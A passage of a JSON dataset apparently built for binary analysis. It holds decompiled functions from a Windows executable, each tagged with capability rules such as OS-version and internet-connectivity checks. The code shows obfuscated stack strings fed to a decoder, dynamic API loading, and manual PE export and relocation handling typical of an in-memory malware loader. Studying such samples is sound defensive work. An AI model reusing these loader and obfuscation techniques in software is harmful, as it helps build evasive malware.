0x5d;\n    uStack172 = 0x71;\n    uStack171 = 0x7b;\n    uStack170 = 0x7e;\n    uStack169 = 0x80;\n    uStack168 = 0x6d;\n    uStack167 = 0x79;\n    uStack166 = 0x5b;\n    uStack165 = 0x74;\n    uStack164 = 0x7d;\n    uStack163 = 0x80;\n    uStack162 = 0x84;\n    uStack161 = 0x8c;\n    uStack160 = 0;\n    uStack159 = 7;\n    uStack158 = 0x6d;\n    uStack157 = 0x4f;\n    uStack156 = 0x72;\n    uStack155 = 0x78;\n    uStack154 = 0x78;\n    uStack153 = 0x78;\n    uStack152 = 0x78;\n    uStack151 = 0;\n    fcn.140006a6c(&uStack184);\n    uStack248 = 0xfb;\n    uStack247 = 0xfc;\n    uStack246 = 0xfe;\n    uStack245 = 0xff;\n    uStack244 = 0xaa;\n    uStack243 = 0x4f;\n    uStack242 = 0x76;\n    uStack241 = 0x46;\n    uStack240 = 0x76;\n    uStack239 = 0x6a;\n    uStack238 = 0x67;\n    uStack237 = 0x7b;\n    uStack236 = 0x6d;\n    uStack235 = 0x5d;\n    uStack234 = 0x72;\n    uStack233 = 0x7d;\n    uStack232 = 0x71;\n    uStack231 = 0x6e;\n    uStack230 = 0x72;\n    uStack229 = 0x54;\n    uStack228 = 0x88;\n    uStack227 = 0;\n    uStack226 = 7;\n    uStack225 = 0x6d;\n    uStack224 = 0x4f;\n    uStack223 = 0x72;\n    uStack222 = 0x78;\n    uStack221 = 0x78;\n    uStack220 = 0x78;\n    uStack219 = 0x78;\n    uStack218 = 0;\n    fcn.140006a6c(&uStack248);\n    uStack296 = 0xfb;\n    uStack295 = 0xfc;\n    uStack294 = 0xfe;\n    uStack293 = 0xff;\n    uStack292 = 0xaa;\n    uStack291 = 0x53;\n    uStack290 = 0x76;\n    uStack289 = 0x6f;\n    uStack288 = 0x4b;\n    uStack287 = 0x6a;\n    uStack286 = 0x7a;\n    uStack285 = 0x4a;\n    uStack284 = 0x77;\n    uStack283 = 0x76;\n    uStack282 = 0x7a;\n    uStack281 = 0x7d;\n    uStack280 = 0x71;\n    uStack279 = 0x80;\n    uStack278 = 0x81;\n    uStack277 = 0x78;\n    uStack276 = 0x7f;\n    uStack275 = 0x7f;\n    uStack274 = 0x69;\n    uStack273 = 0x82;\n    uStack272 = 0x86;\n    uStack271 = 0x80;\n    uStack270 = 0x69;\n    uStack269 = 0x87;\n    uStack268 = 0x79;\n    uStack267 = 0x7c;\n    uStack266 = 0x7f;\n    uStack265 = 0x6e;\n    uStack264 = 0x85;\n    uStack263 = 0x97;\n    uStack262 = 0x83;\n    uStack261 = 0;\n    uStack260 = 7;\n    uStack259 = 0x6d;\n    uStack258 = 0x4f;\n    uStack257 = 0x72;\n    uStack256 = 0x78;\n    uStack255 = 0x78;\n    uStack254 = 0x78;\n    uStack253 = 0x78;\n    uStack252 = 0;\n    fcn.140006a6c(&uStack296);\n    uStack216 = 0xfb;\n    uStack215 = 0xfc;\n    uStack214 = 0xfe;\n    uStack213 = 0xff;\n    uStack212 = 0xaa;\n    uStack211 = 0x53;\n    uStack210 = 0x76;\n    uStack209 = 0x6f;\n    uStack208 = 0x47;\n    uStack207 = 0x74;\n    uStack206 = 0x73;\n    uStack205 = 0x77;\n    uStack204 = 0x7a;\n    uStack203 = 0x6e;\n    uStack202 = 0x7d;\n    uStack201 = 0x7e;\n    uStack200 = 0x4e;\n    uStack199 = 0x82;\n    uStack198 = 0x74;\n    uStack197 = 0x75;\n    uStack196 = 0x75;\n    uStack195 = 0x83;\n    uStack194 = 0;\n    uStack193 = 7;\n    uStack192 = 0x6d;\n    uStack191 = 0x4f;\n    uStack190 = 0x72;\n    uStack189 = 0x78;\n    uStack188 = 0x78;\n    uStack187 = 0x78;\n    uStack186 = 0x78;\n    uStack185 = 0;\n    fcn.140006a6c(&uStack216);\n    *0x14000a9e0 = fcn.140004358(uStack56, &uStack184);\n    *0x14000a9f8 = fcn.140004358(uStack56, &uStack144);\n    *0x14000aa30 = fcn.140004358(uStack56, &uStack248);\n    *0x14000a9d0 = fcn.140004358(uStack56, &uStack296);\n    if (*0x14000a9d0 == 0) {\n        if (*0x14000a9c0 == NULL) {\n            uStack32 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(uStack48);\n        }\n        else {\n            uStack32 = (**0x14000a9c0)(uStack48);\n        }\n        uStack24 = uStack32;\n        *0x14000a9d0 = fcn.140002e3c(uStack32, &uStack296);\n    }\n    *0x14000aa00 = fcn.140004358(uStack56, &uStack216);\n    return 1;\n}\n",
        "token_count": 4025
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t sym.Input.exe_bsearch(ulong arg1, int64_t arg2, ulong arg3, int64_t arg4)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *in_stack_00000028;\n    int32_t iStack40;\n    int32_t iStack36;\n    \n    iStack40 = 0;\n    iStack36 = arg3;\n    while( true ) {\n        while( true ) {\n            if (iStack36 < iStack40) {\n                return 0;\n            }\n            iVar2 = iStack40 + (iStack36 - iStack40) / 2;\n            iVar1 = (*in_stack_00000028)();\n            if (-1 < iVar1) break;\n            iStack36 = iVar2 + -1;\n        }\n        if (iVar1 < 1) break;\n        iStack40 = iVar2 + 1;\n    }\n    return arg2 + iVar2 * arg4;\n}\n",
        "token_count": 211
    },
    "140003ec": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140003ec0(ulong *arg1, code *arg2, ulong arg3)\n\n{\n    ulong *puVar1;\n    ulong uVar2;\n    ulong *puStack24;\n    \n    puStack24 = arg1;\n    while (puStack24 != NULL) {\n        (*arg2)(puStack24[1], 0, 0x8000, arg3);\n        puVar1 = *puStack24;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2, 0, puStack24);\n        puStack24 = puVar1;\n    }\n    return;\n}\n",
        "token_count": 153
    },
    "140003f3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140003f34(uchar *arg1, int64_t arg2)\n\n{\n    uchar *puVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    uchar *puVar4;\n    uchar auStack264 [8];\n    uint32_t uStack256;\n    ulong uStack248;\n    ulong uStack240;\n    ulong uStack232;\n    uchar auStack224 [8];\n    uint32_t uStack216;\n    ulong uStack208;\n    uchar auStack200 [32];\n    uchar auStack168 [32];\n    uchar auStack136 [32];\n    uchar auStack104 [24];\n    uchar auStack80 [24];\n    uchar auStack56 [40];\n    \n    puVar1 = arg1;\n    puVar4 = auStack200;\n    for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    puVar1 = fcn.140004744(auStack80, auStack200);\n    puVar4 = auStack168;\n    for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    puVar1 = auStack168;\n    puVar4 = auStack264;\n    for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    if (uStack256 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        puVar1 = auStack264;\n        puVar4 = auStack136;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = *puVar1;\n            puVar1 = puVar1 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        puVar1 = fcn.14000144c(auStack56, auStack136);\n        puVar4 = auStack104;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = *puVar1;\n            puVar1 = puVar1 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        puVar1 = auStack104;\n        puVar4 = auStack224;\n        for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *puVar4 = *puVar1;\n            puVar1 = puVar1 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        uStack240 = fcn.14000416c(*(arg1 + 0x10), *(arg1 + 8));\n        uStack232 = fcn.14000416c(uStack248, uStack256);\n        fcn.14000428c(arg1 + 0x10, *(arg1 + 8));\n        fcn.14000428c(&uStack248, uStack256);\n        *(arg2 + 0x38) = uStack208;\n        *(arg2 + 0x40) = uStack216;\n        *(arg2 + 8) = uStack240;\n        *(arg2 + 0x18) = *(arg1 + 8);\n        *(arg2 + 0x10) = uStack232;\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 873
    },
    "14000435": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.140004358(int64_t *arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong auStackX16 [3];\n    uint32_t uStack80;\n    uint32_t uStack76;\n    int64_t *piStack72;\n    uint32_t *puStack48;\n    ushort *puStack40;\n    \n    iVar3 = arg1[1];\n    auStackX16[0] = arg2;\n    if (*(*arg1 + 0x8c) == 0) {\n        (*_sym.imp.KERNEL32.dll_SetLastError)(0x7f);\n        iVar3 = 0;\n    }\n    else {\n        iVar4 = iVar3 + *(*arg1 + 0x88);\n        if ((*(iVar4 + 0x18) == 0) || (*(iVar4 + 0x14) == 0)) {\n            (*_sym.imp.KERNEL32.dll_SetLastError)(0x7f);\n            iVar3 = 0;\n        }\n        else {\n            if (arg2 >> 0x10 == 0) {\n                if (arg2 < *(iVar4 + 0x10)) {\n                    (*_sym.imp.KERNEL32.dll_SetLastError)(0x7f);\n                    return 0;\n                }\n                uStack80 = arg2 - *(iVar4 + 0x10);\n            }\n            else {\n                if (*(iVar4 + 0x18) == 0) {\n                    (*_sym.imp.KERNEL32.dll_SetLastError)(0x7f);\n                    return 0;\n                }\n                if (arg1[10] == 0) {\n                    puStack48 = iVar3 + *(iVar4 + 0x20);\n                    puStack40 = iVar3 + *(iVar4 + 0x24);\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                    piStack72 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1, 8);\n                    arg1[10] = piStack72;\n                    if (piStack72 == NULL) {\n                        (*_sym.imp.KERNEL32.dll_SetLastError)(0xe);\n                        return 0;\n                    }\n                    for (uStack76 = 0; uStack76 < *(iVar4 + 0x18); uStack76 = uStack76 + 1) {\n                        *piStack72 = iVar3 + *puStack48;\n                        *(piStack72 + 1) = *puStack40;\n                        puStack48 = puStack48 + 1;\n                        puStack40 = puStack40 + 1;\n                        piStack72 = piStack72 + 2;\n                    }\n                }\n                iVar2 = sym.Input.exe_bsearch(auStackX16, arg1[10], *(iVar4 + 0x18), 0x10);\n                if (iVar2 == 0) {\n                    (*_sym.imp.KERNEL32.dll_SetLastError)(0x7f);\n                    return 0;\n                }\n                uStack80 = *(iVar2 + 8);\n            }\n            if (*(iVar4 + 0x14) < uStack80) {\n                (*_sym.imp.KERNEL32.dll_SetLastError)(0x7f);\n                iVar3 = 0;\n            }\n            else {\n                iVar3 = iVar3 + *(iVar3 + *(iVar4 + 0x1c) + (uStack80 << 2));\n            }\n        }\n    }\n    return iVar3;\n}\n",
        "token_count": 766
    },
    "14000489": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.140004894(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    uint32_t uStack36;\n    uint uStack32;\n    uchar auStack28 [4];\n    int64_t iStack24;\n    uint64_t uStack16;\n    \n    iVar1 = (**0x14000a9d0)(0x102, &uStack36, auStack28);\n    if (-1 < iVar1) {\n        uStack16 = uStack36;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        iStack24 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        fcn.140002470(iStack24, 0, uStack36);\n        if (iStack24 != 0) {\n            fcn.140002470(arg3, 0, arg4);\n            iVar1 = (**0x14000aa00)(0x102, arg1, arg2, arg3, arg4, 0x1000, &uStack32, iStack24);\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2, 0, iStack24);\n            if (-1 < iVar1) {\n                return uStack32;\n            }\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 322
    },
    "1400049a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint64_t fcn.1400049a4(void)\n\n{\n    int32_t iVar1;\n    uint auStack24 [2];\n    int64_t iStack16;\n    \n    auStack24[0] = 0x101;\n    iStack16 = fcn.140006604(0x202, 0x3000, 0x40);\n    if (iStack16 == 0) {\n        iStack16 = 0x140008342;\n    }\n    else {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(iStack16, auStack24);\n        if (iVar1 == 0) {\n            iStack16 = 0x140008342;\n        }\n    }\n    return iStack16;\n}\n",
        "token_count": 165
    },
    "140004a3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.140004a3c(ulong arg1, ulong arg2)\n\n{\n    char cVar1;\n    uchar *puVar2;\n    ulong uVar3;\n    int64_t iVar4;\n    ulong *puVar5;\n    uchar *puVar6;\n    ulong uStack312;\n    uchar auStack304 [8];\n    int32_t iStack296;\n    int64_t iStack288;\n    ulong auStack280 [7];\n    uchar auStack224 [8];\n    uint32_t uStack216;\n    uchar auStack200 [32];\n    uchar auStack168 [32];\n    uchar auStack136 [32];\n    uchar auStack104 [88];\n    \n    uStack312 = fcn.140006604(0x104, 0x3000, 0x40);\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(uStack312, arg1);\n    fcn.140001c80(uStack312);\n    (*_sym.imp.KERNEL32.dll_lstrcatW)(uStack312, arg2);\n    puVar2 = fcn.140005bd4(auStack136, uStack312);\n    puVar6 = auStack200;\n    for (iVar4 = 0x18; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    puVar2 = auStack200;\n    puVar6 = auStack304;\n    for (iVar4 = 0x18; iVar4 != 0; iVar4 = iVar4 + -1) {\n        *puVar6 = *puVar2;\n        puVar2 = puVar2 + 1;\n        puVar6 = puVar6 + 1;\n    }\n    if ((iStack288 == 0) || (iStack296 == 0)) {\n        fcn.14000428c(&uStack312, 0x104);\n        uStack216 = 0;\n    }\n    else {\n        puVar2 = auStack304;\n        puVar6 = auStack168;\n        for (iVar4 = 0x18; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar6 = *puVar2;\n            puVar2 = puVar2 + 1;\n            puVar6 = puVar6 + 1;\n        }\n        cVar1 = fcn.140003f34(auStack168, auStack280);\n        if (cVar1 == '\\0') {\n            uStack216 = 0;\n        }\n        else {\n            fcn.14000428c(&uStack312, 0x104);\n            auStack280[0] = fcn.140004650(arg2);\n            puVar5 = auStack280;\n            puVar2 = auStack104;\n            for (iVar4 = 0x48; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar2 = *puVar5;\n                puVar5 = puVar5 + 1;\n                puVar2 = puVar2 + 1;\n            }\n            cVar1 = fcn.1400031b0(auStack104);\n            if (cVar1 == '\\0') {\n                uStack216 = 0;\n            }\n            else {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3, 0, auStack280[0]);\n                fcn.14000428c(auStack224, uStack216);\n            }\n        }\n    }\n    return uStack216;\n}\n",
        "token_count": 815
    },
    "140004bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nbool fcn.140004bc4(int64_t *arg1, int64_t arg2)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    int32_t *piVar3;\n    int64_t *piVar4;\n    bool bVar5;\n    int32_t iStackX16;\n    uint32_t uStack104;\n    uint32_t *puStack96;\n    uint16_t *puStack72;\n    \n    iVar1 = arg1[1];\n    if (*(*arg1 + 0xb4) == 0) {\n        bVar5 = arg2 == 0;\n    }\n    else {\n        for (puStack96 = iVar1 + *(*arg1 + 0xb0); *puStack96 != 0; puStack96 = fcn.14000336c(puStack96, puStack96[1])) {\n            iVar2 = iVar1 + *puStack96;\n            puStack72 = fcn.14000336c(puStack96, 8);\n            for (uStack104 = 0; uStack104 < (puStack96[1] - 8) / 2; uStack104 = uStack104 + 1) {\n                if (*puStack72 >> 0xc == 3) {\n                    piVar3 = iVar2 + (*puStack72 & 0xfff);\n                    iStackX16 = arg2;\n                    *piVar3 = *piVar3 + iStackX16;\n                }\n                else if (*puStack72 >> 0xc == 10) {\n                    piVar4 = iVar2 + (*puStack72 & 0xfff);\n                    *piVar4 = *piVar4 + arg2;\n                }\n                puStack72 = puStack72 + 1;\n            }\n        }\n        bVar5 = true;\n    }\n    return bVar5;\n}\n",
        "token_count": 402
    },
    "140004da": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140004da0(void)\n\n{\n    ulong arg1;\n    uchar uStack120;\n    uchar uStack119;\n    uchar uStack118;\n    uchar uStack117;\n    uchar uStack116;\n    uchar uStack115;\n    uchar uStack114;\n    uchar uStack113;\n    uchar uStack112;\n    uchar uStack111;\n    uchar uStack110;\n    uchar uStack109;\n    uchar uStack108;\n    uchar uStack107;\n    uchar uStack106;\n    uchar uStack105;\n    uchar uStack104;\n    uchar uStack103;\n    uchar uStack102;\n    uchar uStack101;\n    uchar uStack100;\n    uchar uStack99;\n    uchar uStack98;\n    uchar uStack97;\n    uchar uStack96;\n    uchar uStack95;\n    uchar uStack94;\n    uchar uStack93;\n    uchar uStack88;\n    uchar uStack87;\n    uchar uStack86;\n    uchar uStack85;\n    uchar uStack84;\n    uchar uStack83;\n    uchar uStack82;\n    uchar uStack81;\n    uchar uStack80;\n    uchar uStack79;\n    uchar uStack78;\n    uchar uStack77;\n    uchar uStack76;\n    uchar uStack75;\n    uchar uStack74;\n    uchar uStack73;\n    uchar uStack72;\n    uchar uStack71;\n    uchar uStack70;\n    uchar uStack69;\n    uchar uStack68;\n    uchar uStack67;\n    uchar uStack66;\n    uchar uStack65;\n    uchar uStack64;\n    uchar uStack63;\n    uchar uStack62;\n    uchar uStack61;\n    uchar uStack60;\n    uchar uStack59;\n    uchar uStack58;\n    uchar uStack56;\n    uchar uStack55;\n    uchar uStack54;\n    uchar uStack53;\n    uchar uStack52;\n    uchar uStack51;\n    uchar uStack50;\n    uchar uStack49;\n    uchar uStack48;\n    uchar uStack47;\n    uchar uStack46;\n    uchar uStack45;\n    uchar uStack44;\n    uchar uStack43;\n    uchar uStack42;\n    uchar uStack41;\n    uchar uStack40;\n    uchar uStack39;\n    uchar uStack38;\n    uchar uStack37;\n    uchar uStack36;\n    ulong uStack32;\n    ulong uStack24;\n    ulong uStack16;\n    \n    uStack56 = 0xfb;\n    uStack55 = 0xfc;\n    uStack54 = 0xfe;\n    uStack53 = 0xff;\n    uStack52 = 0xaa;\n    uStack51 = 0x76;\n    uStack50 = 0x75;\n    uStack49 = 0x68;\n    uStack48 = 0x76;\n    uStack47 = 0x38;\n    uStack46 = 0x38;\n    uStack45 = 0;\n    uStack44 = 7;\n    uStack43 = 0x6d;\n    uStack42 = 0x4f;\n    uStack41 = 0x72;\n    uStack40 = 0x78;\n    uStack39 = 0x78;\n    uStack38 = 0x78;\n    uStack37 = 0x78;\n    uStack36 = 0;\n    arg1 = fcn.140006a6c(&uStack56);\n    uStack32 = fcn.1400012cc(arg1);\n    if (*0x14000a9c0 == NULL) {\n        uStack24 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(uStack32);\n    }\n    else {\n        uStack24 = (**0x14000a9c0)(uStack32);\n    }\n    uStack16 = uStack24;\n    uStack120 = 0xfb;\n    uStack119 = 0xfc;\n    uStack118 = 0xfe;\n    uStack117 = 0xff;\n    uStack116 = 0xaa;\n    uStack115 = 0x48;\n    uStack114 = 0x67;\n    uStack113 = 0x77;\n    uStack112 = 0x5b;\n    uStack111 = 0x6e;\n    uStack110 = 0x74;\n    uStack109 = 0x6b;\n    uStack108 = 0x77;\n    uStack107 = 0x80;\n    uStack106 = 0x5c;\n    uStack105 = 0x70;\n    uStack104 = 0x6f;\n    uStack103 = 0x81;\n    uStack102 = 0;\n    uStack101 = 7;\n    uStack100 = 0x6d;\n    uStack99 = 0x4f;\n    uStack98 = 0x72;\n    uStack97 = 0x78;\n    uStack96 = 0x78;\n    uStack95 = 0x78;\n    uStack94 = 0x78;\n    uStack93 = 0;\n    fcn.140006a6c(&uStack120);\n    *0x14000a9f0 = fcn.140002e3c(uStack16, &uStack120);\n    uStack88 = 0xfb;\n    uStack87 = 0xfc;\n    uStack86 = 0xfe;\n    uStack85 = 0xff;\n    uStack84 = 0xaa;\n    uStack83 = 0x48;\n    uStack82 = 0x67;\n    uStack81 = 0x77;\n    uStack80 = 0x48;\n    uStack79 = 0x6a;\n    uStack78 = 0x79;\n    uStack77 = 0x72;\n    uStack76 = 0x7c;\n    uStack75 = 0x78;\n    uStack74 = 0x7a;\n    uStack73 = 0x62;\n    uStack72 = 0x75;\n    uStack71 = 0x7b;\n    uStack70 = 0x72;\n    uStack69 = 0x7e;\n    uStack68 = 0x87;\n    uStack67 = 0;\n    uStack66 = 7;\n    uStack65 = 0x6d;\n    uStack64 = 0x4f;\n    uStack63 = 0x72;\n    uStack62 = 0x78;\n    uStack61 = 0x78;\n    uStack60 = 0x78;\n    uStack59 = 0x78;\n    uStack58 = 0;\n    fcn.140006a6c(&uStack88);\n    *0x14000a9e8 = fcn.140002e3c(uStack16, &uStack88);\n    return 1;\n}\n",
        "token_count": 1492
    },
    "14000518": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.140005180(char *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iStack24;\n    int32_t iStack20;\n    \n    iStack20 = 0;\n    iVar1 = fcn.140002604(arg1);\n    iStack24 = iVar1;\n    while( true ) {\n        while( true ) {\n            iStack24 = iStack24 + -1;\n            if (iStack24 < 0) {\n                return iStack20;\n            }\n            iVar2 = arg1[iStack24] + -0x30;\n            if ((iVar2 < 0) || (arg2 <= iVar2)) break;\n            iVar3 = fcn.140003308(arg2, (iVar1 - iStack24) - 1);\n            iStack20 = iStack20 + iVar2 * iVar3;\n        }\n        if ((iStack24 != 0) || (*arg1 != '-')) break;\n        iStack20 = -iStack20;\n    }\n    return -1;\n}\n",
        "token_count": 244
    },
    "14000529": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140005294(int64_t *arg1)\n\n{\n    int64_t iVar1;\n    code **ppcStack40;\n    \n    iVar1 = arg1[1];\n    if ((*(*arg1 + 0xd0) != 0) && (ppcStack40 = *(iVar1 + *(*arg1 + 0xd0) + 0x18),  ppcStack40 != NULL)) {\n        for (; *ppcStack40 != NULL; ppcStack40 = ppcStack40 + 1) {\n            (**ppcStack40)(iVar1, 1, 0);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 143
    },
    "14000534": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint64_t fcn.140005340(ulong arg1)\n\n{\n    uint64_t uVar1;\n    uint32_t uStack24;\n    \n    uStack24 = 0;\n    while( true ) {\n        if (1 < uStack24) {\n            return CONCAT71(uStack24 >> 8, 1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(*(uStack24 * 8 + 0x14000a098), arg1);\n        if (uVar1 == 0) break;\n        uStack24 = uStack24 + 1;\n    }\n    return uVar1 & 0xffffffffffffff00;\n}\n",
        "token_count": 148
    },
    "14000539": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140005394(void)\n\n{\n    ulong arg1;\n    uchar uStack312;\n    uchar uStack311;\n    uchar uStack310;\n    uchar uStack309;\n    uchar uStack308;\n    uchar uStack307;\n    uchar uStack306;\n    uchar uStack305;\n    uchar uStack304;\n    uchar uStack303;\n    uchar uStack302;\n    uchar uStack301;\n    uchar uStack300;\n    uchar uStack299;\n    uchar uStack298;\n    uchar uStack297;\n    uchar uStack296;\n    uchar uStack295;\n    uchar uStack294;\n    uchar uStack293;\n    uchar uStack292;\n    uchar uStack291;\n    uchar uStack290;\n    uchar uStack289;\n    uchar uStack288;\n    uchar uStack287;\n    uchar uStack286;\n    uchar uStack285;\n    uchar uStack280;\n    uchar uStack279;\n    uchar uStack278;\n    uchar uStack277;\n    uchar uStack276;\n    uchar uStack275;\n    uchar uStack274;\n    uchar uStack273;\n    uchar uStack272;\n    uchar uStack271;\n    uchar uStack270;\n    uchar uStack269;\n    uchar uStack268;\n    uchar uStack267;\n    uchar uStack266;\n    uchar uStack265;\n    uchar uStack264;\n    uchar uStack263;\n    uchar uStack262;\n    uchar uStack261;\n    uchar uStack260;\n    uchar uStack259;\n    uchar uStack258;\n    uchar uStack257;\n    uchar uStack256;\n    uchar uStack255;\n    uchar uStack254;\n    uchar uStack253;\n    uchar uStack252;\n    uchar uStack251;\n    uchar uStack250;\n    uchar uStack248;\n    uchar uStack247;\n    uchar uStack246;\n    uchar uStack245;\n    uchar uStack244;\n    uchar uStack243;\n    uchar uStack242;\n    uchar uStack241;\n    uchar uStack240;\n    uchar uStack239;\n    uchar uStack238;\n    uchar uStack237;\n    uchar uStack236;\n    uchar uStack235;\n    uchar uStack234;\n    uchar uStack233;\n    uchar uStack232;\n    uchar uStack231;\n    uchar uStack230;\n    uchar uStack229;\n    uchar uStack228;\n    uchar uStack227;\n    uchar uStack226;\n    uchar uStack225;\n    uchar uStack224;\n    uchar uStack223;\n    uchar uStack222;\n    uchar uStack221;\n    uchar uStack220;\n    uchar uStack219;\n    uchar uStack218;\n    uchar uStack216;\n    uchar uStack215;\n    uchar uStack214;\n    uchar uStack213;\n    uchar uStack212;\n    uchar uStack211;\n    uchar uStack210;\n    uchar uStack209;\n    uchar uStack208;\n    uchar uStack207;\n    uchar uStack206;\n    uchar uStack205;\n    uchar uStack204;\n    uchar uStack203;\n    uchar uStack202;\n    uchar uStack201;\n    uchar uStack200;\n    uchar uStack199;\n    uchar uStack198;\n    uchar uStack197;\n    uchar uStack196;\n    uchar uStack195;\n    uchar uStack194;\n    uchar uStack193;\n    uchar uStack192;\n    uchar uStack191;\n    uchar uStack190;\n    uchar uStack189;\n    uchar uStack188;\n    uchar uStack187;\n    uchar uStack186;\n    uchar uStack184;\n    uchar uStack183;\n    uchar uStack182;\n    uchar uStack181;\n    uchar 